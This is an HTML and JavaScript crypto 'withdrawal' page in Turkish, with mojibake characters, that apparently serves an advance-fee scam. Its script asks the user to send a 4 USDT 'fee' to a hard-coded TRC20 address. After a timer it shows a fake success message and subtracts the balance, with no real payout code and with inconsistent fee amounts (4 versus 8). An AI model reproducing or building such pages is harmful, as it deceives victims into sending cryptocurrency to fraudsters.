<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Para √áekme</title>
  <style>
    /* Body t√ºm sayfayƒ± tam ortalar, yatay ve dikey */
    body {
      background: linear-gradient(to right, #181a29, #0f1120);
      color: #eee;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      margin: 0;
      height: 100vh; /* Tam y√ºkseklik */
      display: flex;
      justify-content: center; /* Yatay ortala */
      align-items: center;     /* Dikey ortala */
      padding: 20px;
      box-sizing: border-box;
    }

    /* Kart kutucuƒüu */
    .card {
      background: #222436;
      padding: 30px 25px;
      border-radius: 16px;
      box-shadow: 0 0 20px rgba(0,0,0,0.5);
      max-width: 400px;
      width: 100%;
      box-sizing: border-box;
      text-align: center; /* ƒ∞√ßeriƒüi ortala */
    }

    /* Ba≈ülƒ±k */
    h1 {
      color: #1abc9c;
      font-size: 28px;
      margin-bottom: 20px;
    }

    /* Bakiye kutusu */
    .balance-box {
      font-size: 18px;
      background: #1e2033;
      padding: 10px 15px;
      border-radius: 8px;
      margin-bottom: 20px;
      word-wrap: break-word;
    }

    /* Input ve butonlar */
    input, button {
      width: 100%;
      padding: 12px 15px;
      margin: 10px 0;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      font-weight: bold;
      box-sizing: border-box;
    }

    input {
      background: #33364d;
      color: #fff;
      transition: background 0.3s ease;
    }
    input::placeholder {
      color: #bbb;
    }
    input:focus {
      outline: 2px solid #1abc9c;
      background: #2a2e47;
    }

    button {
      background: #1abc9c;
      color: white;
      cursor: pointer;
      transition: background 0.3s;
    }
    button:hover, button:focus {
      background: #16a085;
      outline: none;
    }

    /* Mesaj alanƒ± */
    #withdrawMessage {
      margin-top: 20px;
      font-weight: bold;
      white-space: pre-line;
      min-height: 60px;
      word-wrap: break-word;
      color: #fff;
    }

    /* Kopyala butonu */
    .copy-btn {
      margin-top: 10px;
      background: #444;
      color: #fff;
      font-size: 14px;
      padding: 8px 12px;
      border-radius: 6px;
      cursor: pointer;
      border: none;
      width: auto;
      display: inline-block;
    }

    /* Destek butonu */
    .support-btn {
      margin-top: 25px;
      display: block;
      width: 100%;
      padding: 12px;
      background: #5865F2;
      color: white;
      text-align: center;
      border-radius: 8px;
      font-weight: bold;
      text-decoration: none;
      transition: background 0.3s;
      box-sizing: border-box;
    }
    .support-btn:hover, .support-btn:focus {
      background: #4752c4;
      outline: none;
    }

    /* Responsive */
    @media (max-width: 480px) {
      body {
        padding: 10px;
      }

      h1 {
        font-size: 24px;
        margin-bottom: 15px;
      }

      .card {
        padding: 20px 15px;
      }

      input, button {
        font-size: 15px;
        padding: 10px 12px;
        margin: 8px 0;
      }

      .balance-box {
        font-size: 16px;
        padding: 8px 12px;
        margin-bottom: 15px;
      }

      #withdrawMessage {
        font-size: 14px;
        min-height: auto;
      }
    }
  </style>
</head>
<body>

  <div class="card">
    <h1>üí∏ PARA √áEKME üí∏</h1>

    <div class="balance-box">Bakiye: <span id="balance">0.0000</span> USDT</div>

    <input type="text" id="withdrawAddress" placeholder="TRC20 C√ºzdan Adresi" autocomplete="off" />
    <input type="number" id="withdrawAmount" placeholder="√áekilecek Miktar (min 50 USDT)" min="50" step="0.01" />

    <button id="withdrawBtn">Para √áek</button>

    <div id="withdrawMessage"></div>

    <a href="https://t.me/rexfinans" target="_blank" class="support-btn" rel="noopener noreferrer" tabindex="0">üìû Destek Al</a>
  </div>

  <!-- Alt Men√º Alanƒ± -->
  <div id="bottomMenu"></div>

  <!-- Men√º HTML'i Y√ºkle -->
  <script>
    fetch("bottom-menu.html")
      .then(res => res.text())
      .then(html => {
        document.getElementById("bottomMenu").innerHTML = html;
      });
  </script>

  <!-- Men√º.js -->
  <script src="men√º.js"></script>

  <!-- Firebase ve ƒ∞≈ülem Script -->
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js";
    import { getFirestore, doc, getDoc, setDoc } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore.js";

    const firebaseConfig = {
      apiKey: "AIzaSyBXddctTbfBzgJ9sgtVCvSMtNJRd3JVeHs",
      authDomain: "crypto-eccb4.firebaseapp.com",
      projectId: "crypto-eccb4",
      storageBucket: "crypto-eccb4.appspot.com",
      messagingSenderId: "773649197313",
      appId: "1:773649197313:web:18da6ed3ee63353c4e9300"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    const withdrawBtn = document.getElementById("withdrawBtn");
    const withdrawAddress = document.getElementById("withdrawAddress");
    const withdrawAmount = document.getElementById("withdrawAmount");
    const withdrawMessage = document.getElementById("withdrawMessage");
    const balanceSpan = document.getElementById("balance");

    let userId = localStorage.getItem("userId");
    if (!userId) {
      userId = "user_" + Math.random().toString(36).substring(2, 10);
      localStorage.setItem("userId", userId);
    }

    let balance = 0;
    (async () => {
      const ref = doc(db, "balances", userId);
      const snap = await getDoc(ref);
      if (snap.exists()) {
        balance = snap.data().amount;
        updateBalanceDisplay(balance);
      }
    })();

    function updateBalanceDisplay(value) {
      balanceSpan.textContent = value.toFixed(4);
    }

    withdrawBtn.onclick = () => {
      withdrawMessage.style.color = "#ff5555";
      const addr = withdrawAddress.value.trim();
      const amount = parseFloat(withdrawAmount.value);

      if (addr.length < 10) {
        withdrawMessage.textContent = "‚ö†Ô∏è Ge√ßersiz c√ºzdan adresi!";
        return;
      }
      if (isNaN(amount) || amount < 50) {
        withdrawMessage.textContent = "‚ö†Ô∏è Minimum 50 USDT √ßekebilirsiniz.";
        return;
      }
      if (amount + 8 > balance) {
        withdrawMessage.textContent = "‚ùå Yetersiz bakiye.";
        return;
      }

      withdrawMessage.style.color = "#ffaa00";
      withdrawMessage.innerHTML = `L√ºtfen 4 USDT i≈ülem √ºcretini a≈üaƒüƒ±daki adrese g√∂nderin:\n<strong>TPHNV2S6d5oFJarPVju2XV2xBkwDbbyjaH</strong>`;

      const copyBtn = document.createElement("button");
      copyBtn.textContent = "Adresi Kopyala";
      copyBtn.className = "copy-btn";
      copyBtn.onclick = () => {
        navigator.clipboard.writeText("TPHNV2S6d5oFJarPVju2XV2xBkwDbbyjaH");
        copyBtn.textContent = "Kopyalandƒ± ‚úÖ";
      };
      withdrawMessage.appendChild(copyBtn);

      setTimeout(() => {
        balance -= (amount + 8);
        updateBalanceDisplay(balance);
        withdrawMessage.style.color = "#55ff55";
        withdrawMessage.innerHTML = `‚úÖ ${amount.toFixed(2)} USDT ba≈üarƒ±yla √ßekildi.\nüí∏ 8 USDT i≈ülem √ºcreti kesildi.`;

        withdrawAmount.value = "";
        withdrawAddress.value = "";

        setDoc(doc(db, "balances", userId), { amount: balance });
      }, 3500);
    };
  </script>

</body>
</html>
